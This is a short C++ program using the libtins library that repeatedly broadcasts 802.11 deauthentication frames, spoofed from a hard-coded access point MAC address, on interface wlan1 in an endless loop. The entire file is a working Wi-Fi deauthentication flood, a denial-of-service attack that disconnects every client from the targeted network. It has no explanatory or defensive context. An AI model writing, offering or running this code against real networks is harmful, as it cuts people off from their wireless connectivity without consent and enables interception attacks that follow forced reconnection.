#include <iostream>
#include <tins/tins.h>
#include <unistd.h>
using namespace Tins;
using namespace std;

int main()
{
    RadioTap radio;
    PacketSender sender;
    Dot11Deauthentication Deauth("FF:FF:FF:FF:FF:FF","C4:88:E5:0B:16:E4");
    radio.inner_pdu(Deauth);
    while(1)
    {
        sender.send(radio,"wlan1");
        sleep(0.3);
    }
    // "C4:88:E5:0B:16:E4"
}
